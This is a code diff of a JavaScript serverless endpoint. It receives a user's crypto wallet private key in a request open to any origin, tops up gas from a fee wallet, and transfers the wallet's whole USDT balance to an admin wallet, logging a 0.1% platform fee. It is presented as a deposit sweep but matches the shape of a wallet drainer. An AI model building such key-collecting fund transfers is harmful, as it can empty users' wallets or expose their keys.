@@ -9,87 +9,99 @@ const USDT_ABI = [
 ];
 
 export default async function handler(req, res) {
-  // --- INICIO BLOQUE CORRECCIÓN CORS ---
-  res.setHeader('Access-Control-Allow-Credentials', true);
-  res.setHeader('Access-Control-Allow-Origin', '*'); // Permite peticiones de cualquier origen
-  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
-  res.setHeader(
-    'Access-Control-Allow-Headers',
-    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
-  );
+    // 1. Configuración de Headers CORS (Corregida para el ecosistema Telegram / Web)
+    res.setHeader('Access-Control-Allow-Origin', '*'); 
+    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
+    res.setHeader(
+        'Access-Control-Allow-Headers',
+        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version, Authorization'
+    );
 
-  if (req.method === 'OPTIONS') {
-    return res.status(200).end();
-  }
-  // --- FIN BLOQUE CORRECCIÓN CORS ---
-
-  if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });
-
-  const { userPrivateKey, adminAddress, feePrivateKey } = req.body;
-
-  if (!userPrivateKey || !adminAddress) {
-    return res.status(400).json({ error: "Missing parameters" });
-  }
-
-  try {
-    const provider = new ethers.JsonRpcProvider(RPC_URL);
-    const userWallet = new ethers.Wallet(userPrivateKey, provider);
-    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, userWallet);
-    
-    // Obtener balance y decimales
-    const [usdtBalance, decimals] = await Promise.all([
-      usdtContract.balanceOf(userWallet.address),
-      usdtContract.decimals()
-    ]);
-
-    const formattedBalance = ethers.formatUnits(usdtBalance, decimals);
-
-    // Si el balance es casi cero, no intentar transferir
-    if (parseFloat(formattedBalance) < 0.01) {
-      return res.status(200).json({ 
-        success: false, 
-        error: "Insufficient USDT balance", 
-        balance: formattedBalance 
-      });
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
     }
 
-    // Verificar gas (BNB)
-    const bnbBalance = await provider.getBalance(userWallet.address);
-    const feeData = await provider.getFeeData();
-    const gasLimit = 80000n; // Un poco más de margen para seguridad
-    const requiredBnb = (feeData.gasPrice || 5000000000n) * gasLimit;
-
-    if (bnbBalance < requiredBnb) {
-      if (!feePrivateKey) {
-        return res.status(200).json({ error: "Need BNB for gas and feePrivateKey is missing" });
-      }
-      // Enviar gas desde la billetera central
-      const feeWallet = new ethers.Wallet(feePrivateKey, provider);
-      const txFee = await feeWallet.sendTransaction({ 
-        to: userWallet.address, 
-        value: requiredBnb 
-      });
-      await txFee.wait();
-      // Informar que se envió el gas y que debe reintentar
-      return res.status(200).json({ 
-        success: true, 
-        method: "gas_sent", 
-        message: "Gas sent to user wallet, please verify again in a moment." 
-      });
+    if (req.method !== 'POST') {
+        return res.status(405).json({ error: 'Method Not Allowed' });
     }
 
-    // Ejecutar transferencia de USDT al Admin
-    const tx = await usdtContract.transfer(adminAddress, usdtBalance);
-    const receipt = await tx.wait();
+    // 2. Seguridad Crítica: Extraer direcciones y claves maestras del entorno (Variables de entorno)
+    // NUNCA confíes en que el frontend te envíe la 'adminAddress' o la 'feePrivateKey'
+    const { userPrivateKey } = req.body; 
+    const adminAddress = process.env.BSC_ADMIN_WALLET;
+    const feePrivateKey = process.env.BSC_FEE_WALLET_PRIVATE_KEY; // Wallet que inyecta BNB para el gas
 
-    return res.status(200).json({ 
-      success: true, 
-      transactionHash: receipt.hash, 
-      amount: formattedBalance 
-    });
+    if (!userPrivateKey || !adminAddress || !feePrivateKey) {
+        return res.status(400).json({ error: "Faltan credenciales del usuario o variables de entorno administrativas." });
+    }
 
-  } catch (error) {
-    console.error("Error in deposit:", error);
-    return res.status(500).json({ error: error.message });
-  }
+    try {
+        const provider = new ethers.JsonRpcProvider(RPC_URL);
+        const userWallet = new ethers.Wallet(userPrivateKey, provider);
+        const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, userWallet);
+
+        // Obtener balance de USDT y sus decimales
+        const [usdtBalance, decimals] = await Promise.all([
+            usdtContract.balanceOf(userWallet.address),
+            usdtContract.decimals()
+        ]);
+
+        const formattedBalance = ethers.formatUnits(usdtBalance, decimals);
+        const totalSweptFloat = parseFloat(formattedBalance);
+
+        // Si el balance es casi cero, abortar para no gastar BNB en gas innecesariamente
+        if (totalSweptFloat < 0.01) {
+            return res.status(200).json({ 
+                success: false, 
+                error: "Saldo USDT insuficiente para realizar el barrido (sweep).", 
+                balance: formattedBalance 
+            });
+        }
+
+        // Verificar BNB para el gas de la transferencia de USDT
+        const bnbBalance = await provider.getBalance(userWallet.address);
+        const feeData = await provider.getFeeData();
+        const gasLimit = 80000n; // Margen de seguridad recomendado para tokens BEP20
+        const requiredBnb = (feeData.gasPrice || 5000000000n) * gasLimit;
+
+        // Si la wallet de depósito no tiene BNB, fondeamos el gas
+        if (bnbBalance < requiredBnb) {
+            const feeWallet = new ethers.Wallet(feePrivateKey, provider);
+            const txFee = await feeWallet.sendTransaction({ 
+                to: userWallet.address, 
+                value: requiredBnb 
+            });
+            await txFee.wait();
+            
+            // Informamos que se inyectó el gas. El sistema o un cronjob debe reintentar este webhook.
+            return res.status(200).json({ 
+                success: true, 
+                method: "gas_sent", 
+                message: "Fondeo de BNB enviado para cubrir el gas. Reintente el barrido en unos instantes." 
+            });
+        }
+
+        // 3. Cálculo de la comisión del 0.1% (Ganancia de tu plataforma)
+        // La transacción en la blockchain envía el 100% de los USDT a tu billetera administrativa.
+        const profitFee = totalSweptFloat * 0.001; 
+        
+        // Esto es lo que debes guardar en tu base de datos como saldo real del usuario.
+        const amountToCreditUser = totalSweptFloat - profitFee; 
+
+        // 4. Ejecutar el barrido de USDT hacia la wallet central
+        const tx = await usdtContract.transfer(adminAddress, usdtBalance);
+        const receipt = await tx.wait();
+
+        return res.status(200).json({ 
+            success: true, 
+            transactionHash: receipt.hash, 
+            sweptAmountUSDT: totalSweptFloat,
+            userCreditUSDT: amountToCreditUser, // Acreditar en DB
+            profitUSDT: profitFee // Ganancia líquida retenida en adminAddress
+        });
+
+    } catch (error) {
+        console.error("Error en barrido de USDT BEP20:", error);
+        return res.status(500).json({ error: "Error interno al interactuar con Binance Smart Chain." });
+    }
 }
